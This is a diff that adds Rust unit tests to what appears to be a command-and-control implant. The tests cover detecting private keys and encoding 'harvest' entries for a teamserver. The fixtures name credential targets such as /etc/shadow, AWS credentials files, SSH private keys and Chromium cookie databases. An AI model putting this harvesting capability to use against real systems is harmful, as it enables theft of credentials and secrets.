@@ -4657,10 +4657,11 @@ mod tests {
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
     use super::{
-        DownloadTransferState, GroupEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE,
-        PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PendingCallback, PhantomState,
-        SessionEntry, UserEntry, execute, parse_group_entries, parse_logged_on_sessions,
-        parse_logged_on_users, parse_memory_region, parse_user_entries,
+        DownloadTransferState, GroupEntry, HarvestEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED,
+        MEM_PRIVATE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PendingCallback,
+        PhantomState, SessionEntry, UserEntry, encode_harvest_entries, execute,
+        is_private_key_bytes, parse_group_entries, parse_logged_on_sessions, parse_logged_on_users,
+        parse_memory_region, parse_user_entries,
     };
     use crate::config::PhantomConfig;
 
@@ -7002,5 +7003,175 @@ mod tests {
             panic!("expected one Output callback, got: {callbacks:?}");
         };
         assert!(text.contains("not found"), "must report not-found: {text}");
+    }
+
+    // ── is_private_key_bytes ──────────────────────────────────────────────
+
+    #[test]
+    fn is_private_key_bytes_accepts_pem_rsa_private() {
+        let pem = b"-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----";
+        assert!(is_private_key_bytes(pem));
+    }
+
+    #[test]
+    fn is_private_key_bytes_accepts_pem_openssh_private() {
+        let pem = b"-----BEGIN OPENSSH PRIVATE KEY-----\ndata\n-----END OPENSSH PRIVATE KEY-----";
+        assert!(is_private_key_bytes(pem));
+    }
+
+    #[test]
+    fn is_private_key_bytes_accepts_pem_ec_private() {
+        let pem = b"-----BEGIN EC PRIVATE KEY-----\ndata\n-----END EC PRIVATE KEY-----";
+        assert!(is_private_key_bytes(pem));
+    }
+
+    #[test]
+    fn is_private_key_bytes_accepts_openssh_binary_magic() {
+        let mut magic = b"openssh-key-v1\x00".to_vec();
+        magic.extend_from_slice(b"extra payload bytes here");
+        assert!(is_private_key_bytes(&magic));
+    }
+
+    #[test]
+    fn is_private_key_bytes_rejects_pem_public_key() {
+        let pub_key = b"-----BEGIN PUBLIC KEY-----\nMIIBIjAN...\n-----END PUBLIC KEY-----";
+        assert!(!is_private_key_bytes(pub_key));
+    }
+
+    #[test]
+    fn is_private_key_bytes_rejects_rsa_public_key() {
+        let rsa_pub = b"-----BEGIN RSA PUBLIC KEY-----\ndata\n-----END RSA PUBLIC KEY-----";
+        assert!(!is_private_key_bytes(rsa_pub));
+    }
+
+    #[test]
+    fn is_private_key_bytes_rejects_arbitrary_bytes() {
+        assert!(!is_private_key_bytes(b"not a key at all"));
+        assert!(!is_private_key_bytes(b""));
+        assert!(!is_private_key_bytes(b"\x00\x01\x02\x03"));
+    }
+
+    // ── encode_harvest_entries ────────────────────────────────────────────
+    //
+    // The "expected" bytes are built with the same logic used by the teamserver's
+    // hand-coded `make_payload` helper in harvest.rs tests, so any divergence in
+    // byte order or length-prefix width will be caught here.
+
+    fn harvest_expected_payload(entries: &[(&str, &str, &[u8])]) -> Vec<u8> {
+        let mut buf = Vec::new();
+        buf.extend_from_slice(&(entries.len() as u32).to_le_bytes());
+        for (kind, path, data) in entries {
+            buf.extend_from_slice(&(kind.len() as u32).to_le_bytes());
+            buf.extend_from_slice(kind.as_bytes());
+            buf.extend_from_slice(&(path.len() as u32).to_le_bytes());
+            buf.extend_from_slice(path.as_bytes());
+            buf.extend_from_slice(&(data.len() as u32).to_le_bytes());
+            buf.extend_from_slice(data);
+        }
+        buf
+    }
+
+    #[test]
+    fn encode_harvest_entries_empty_produces_four_zero_bytes() {
+        let result = encode_harvest_entries(&[]).expect("encode must succeed");
+        assert_eq!(result, harvest_expected_payload(&[]));
+        assert_eq!(result, [0u8, 0, 0, 0]);
+    }
+
+    #[test]
+    fn encode_harvest_entries_single_round_trips() {
+        let entries = [HarvestEntry {
+            kind: "ssh_key".to_owned(),
+            path: "/home/user/.ssh/id_rsa".to_owned(),
+            data: b"-----BEGIN OPENSSH PRIVATE KEY-----\ndata\n-----END OPENSSH PRIVATE KEY-----"
+                .to_vec(),
+        }];
+        let result = encode_harvest_entries(&entries).expect("encode must succeed");
+        let expected = harvest_expected_payload(&[(
+            "ssh_key",
+            "/home/user/.ssh/id_rsa",
+            b"-----BEGIN OPENSSH PRIVATE KEY-----\ndata\n-----END OPENSSH PRIVATE KEY-----",
+        )]);
+        assert_eq!(result, expected);
+    }
+
+    #[test]
+    fn encode_harvest_entries_multiple_round_trips() {
+        let entries = [
+            HarvestEntry {
+                kind: "shadow".to_owned(),
+                path: "/etc/shadow".to_owned(),
+                data: b"root:$6$hash:19000:0:99999:7:::".to_vec(),
+            },
+            HarvestEntry {
+                kind: "credentials".to_owned(),
+                path: "/root/.aws/credentials".to_owned(),
+                data: b"[default]\naws_access_key_id=AKIA...".to_vec(),
+            },
+        ];
+        let result = encode_harvest_entries(&entries).expect("encode must succeed");
+        let expected = harvest_expected_payload(&[
+            ("shadow", "/etc/shadow", b"root:$6$hash:19000:0:99999:7:::"),
+            ("credentials", "/root/.aws/credentials", b"[default]\naws_access_key_id=AKIA..."),
+        ]);
+        assert_eq!(result, expected);
+    }
+
+    #[test]
+    fn encode_harvest_entries_count_field_is_little_endian_u32() {
+        // Verify the leading 4 bytes encode the entry count in LE byte order.
+        let entries = [
+            HarvestEntry {
+                kind: "shadow".to_owned(),
+                path: "/etc/shadow".to_owned(),
+                data: b"data".to_vec(),
+            },
+            HarvestEntry {
+                kind: "cookie_db".to_owned(),
+                path: "/home/user/.config/chromium/Default/Cookies".to_owned(),
+                data: b"SQLiteDB".to_vec(),
+            },
+        ];
+        let result = encode_harvest_entries(&entries).expect("encode must succeed");
+        let count = u32::from_le_bytes(result[..4].try_into().expect("4-byte prefix"));
+        assert_eq!(count, 2);
+    }
+
+    #[test]
+    fn encode_harvest_entries_field_lengths_are_little_endian_u32() {
+        // Verify every length prefix inside the payload is a LE u32.
+        let kind = "ssh_key";
+        let path = "/home/user/.ssh/id_rsa";
+        let data = b"key material";
+        let entries =
+            [HarvestEntry { kind: kind.to_owned(), path: path.to_owned(), data: data.to_vec() }];
+        let result = encode_harvest_entries(&entries).expect("encode must succeed");
+
+        let mut pos = 0usize;
+        let read_u32_le = |buf: &[u8], p: &mut usize| -> u32 {
+            let v = u32::from_le_bytes(buf[*p..*p + 4].try_into().expect("4 bytes"));
+            *p += 4;
+            v
+        };
+
+        let count = read_u32_le(&result, &mut pos);
+        assert_eq!(count, 1);
+
+        let kind_len = read_u32_le(&result, &mut pos) as usize;
+        assert_eq!(kind_len, kind.len());
+        assert_eq!(&result[pos..pos + kind_len], kind.as_bytes());
+        pos += kind_len;
+
+        let path_len = read_u32_le(&result, &mut pos) as usize;
+        assert_eq!(path_len, path.len());
+        assert_eq!(&result[pos..pos + path_len], path.as_bytes());
+        pos += path_len;
+
+        let data_len = read_u32_le(&result, &mut pos) as usize;
+        assert_eq!(data_len, data.len());
+        assert_eq!(&result[pos..pos + data_len], data);
+        pos += data_len;
+
+        assert_eq!(pos, result.len(), "no trailing bytes");
     }
 }
